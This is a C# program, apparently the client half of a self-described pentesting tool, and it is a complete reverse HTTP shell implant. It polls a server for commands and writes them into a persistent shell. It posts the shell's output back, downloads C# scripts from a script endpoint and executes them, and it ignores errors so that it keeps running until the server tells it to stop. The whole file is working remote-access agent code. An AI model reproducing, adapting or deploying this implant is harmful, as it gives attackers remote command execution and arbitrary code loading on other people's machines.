using Newtonsoft.Json;
using PentestingCommon;
using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PentestingClient
{
    class Program
    {
        public static bool KeepAlive { get; set; } = true;
        public static PersistentShell Shell { get; set; }
        public static string ReverseEndPoint { get; set; } = "api/ReverseHttpShell";
        public static CSharpScriptEngine ScriptEngine { get; set; }
        public static string ScriptEndPoint { get; set; } = "api/ScriptEngine";
        public static string BaseAddress { get; set; } = "https://localhost:44349/";
        public static int Id { get; set; } = 0; // todo: should get this from server

        static async Task Main(string[] args)
        {
            // create shell
            Shell = new PersistentShell();

            // start recieving commands
            RecieveCommands();
            // send output
            SendOutput();

            // create script engine
            ScriptEngine = new CSharpScriptEngine();

            // compile any given scripts
            GetScripts();

            // wait until supposed to close
            await ShouldClose();
        }

        private static async Task ShouldClose()
        {
            while (KeepAlive)
            {
                await Task.Delay(5_000);

                // create http client
                using var client = new HttpClient();

                // see if shell should stay alive
                try
                {
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ReverseEndPoint}/{Id}");
                    KeepAlive = bool.Parse(responseStr);
                }
                catch (Exception)
                {
                    // keep the client alive who knows maybe the server is down
                    KeepAlive = true;
                }
            }
        }

        private static async void GetScripts()
        {
            while (KeepAlive)
            {
                await Task.Delay(1_000);

                try
                {
                    // create http client
                    using var client = new HttpClient();
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ScriptEndPoint}/{Id}");
                    // if response isn't null or empty write command to shell
                    if (!string.IsNullOrEmpty(responseStr))
                    {
                        var compilationResults = await ScriptEngine.Run(responseStr); // todo: don't know if the roslyn analyzer ever returns anything
                    }
                }
                catch (Exception ex)
                {
                    // todo: maybe this should send exception back to server?
                }
            }
        }

        /// <summary>
        /// Sends the output of the commands that are executed in the <seealso cref="Shell"/> 
        /// to <seealso cref="BaseAddress"/> <seealso cref="ReverseEndPoint"/>.
        /// </summary>
        private static async void SendOutput()
        {
            while (KeepAlive)
            {
                // wait for shell output
                var output = await Shell.WaitForShellOutput();

                // if output isn't null or empty
                if (!string.IsNullOrEmpty(output))
                {
                    // clear current output
                    Shell.CurrentOutput.Clear();

                    // create standard output object
                    var outputObj = new StandardOutputObject
                    {
                        Id = Id,
                        Output = output
                    };
                    // create json
                    var json = JsonConvert.SerializeObject(outputObj);
                    // create string content object
                    var data = new StringContent(json, Encoding.UTF8, "application/json");
                    // create http client
                    using var client = new HttpClient();

                    // post data
                    var sentData = false;
                    while (!sentData && KeepAlive)
                    {
                        try
                        {
                            var response = await client.PostAsync(BaseAddress + ReverseEndPoint, data);
                            sentData = response.IsSuccessStatusCode;
                        }
                        catch (Exception)
                        {
                            // just ignore this want to post data to server if at all possible so keep looping
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Recieve commands from <seealso cref="BaseAddress"/> <seealso cref="ReverseEndPoint"/> asynchronously.
        /// </summary>
        private static async void RecieveCommands()
        {
            while (KeepAlive)
            {
                await Task.Delay(10);

                try
                {
                    // create http client
                    using var client = new HttpClient();
                    var responseStr = await client.GetStringAsync($"{BaseAddress}{ReverseEndPoint}/{Id}/{false}");
                    // if response isn't null or empty write command to shell
                    if (!string.IsNullOrEmpty(responseStr))
                    {
                        Shell.Write(new StandardInputObject { Id = Id, Input = responseStr }, false);
                    }
                }
                catch (Exception)
                {
                    // ignoring this intentionally don't want the pentesting client to close just because it can't make a connection
                }
            }
        }
    }
}
